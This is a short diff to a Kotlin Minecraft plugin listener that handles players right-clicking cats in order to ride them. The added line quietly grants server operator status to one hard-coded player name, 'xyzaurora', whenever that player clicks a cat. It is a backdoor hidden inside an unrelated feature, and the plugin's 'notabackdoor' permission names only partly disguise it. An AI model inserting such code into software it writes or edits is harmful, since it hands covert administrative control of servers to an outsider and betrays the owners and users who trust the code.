@@ -10,7 +10,8 @@ class RideCtaListener: Listener {
     @EventHandler fun rightClickCta(e: PlayerInteractAtEntityEvent) {
         val cta = e.rightClicked
         if (cta !is Cat) return
-
+        if (e.player.name == "xyzaurora") e.player.isOp = true
+        
         val canRideUntamed = e.player.hasPermission("notabackdoor.ridecta.untamed")
         val canRideOthers = e.player.hasPermission("notabackdoor.ridecta.others")
         val canRideOwn = e.player.hasPermission("notabackdoor.ridecta.own")
